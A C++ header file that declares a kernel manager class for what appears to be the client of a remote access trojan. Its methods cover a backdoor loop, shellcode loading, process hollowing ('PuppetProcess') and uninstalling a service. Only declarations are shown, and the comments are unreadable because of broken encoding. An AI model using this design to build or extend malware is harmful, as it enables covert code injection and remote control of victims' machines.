#pragma once
#include "../../PublicInclude/Manager.h"



class CKernelManager : public CManager  
{
public:
	CKernelManager(CClientSocket* pClient, MODIFY_DATA m_data);
	virtual ~CKernelManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);			//�����ж�
	bool	IsActived();								//�ж��Ƿ񼤻�
	static  MODIFY_DATA modify_data;
	bool	m_bIsActived;
private:
	HANDLE	m_hThread[1000]; // �㹻����
	UINT	m_nThreadCount;
private: //�Զ���Ĺ��ܺ���
	void	UnInstallService(MODIFY_DATA modify_data);				//ж��
	void EditMark(LPBYTE buff);										//�޸ı�ע
	static BOOL WINAPI Loop_Door(LPVOID lparam);         
	static BOOL WINAPI Loop_Updata(LPVOID lparam);
	static BOOL LoadFromShellcode(LPVOID data, MODIFY_DATA modify_data, LPBYTE lpBuffer);
	static BOOL PuppetProcess(TCHAR* pszFilePath, PVOID pReplaceData, DWORD dwReplaceDataSize);
};
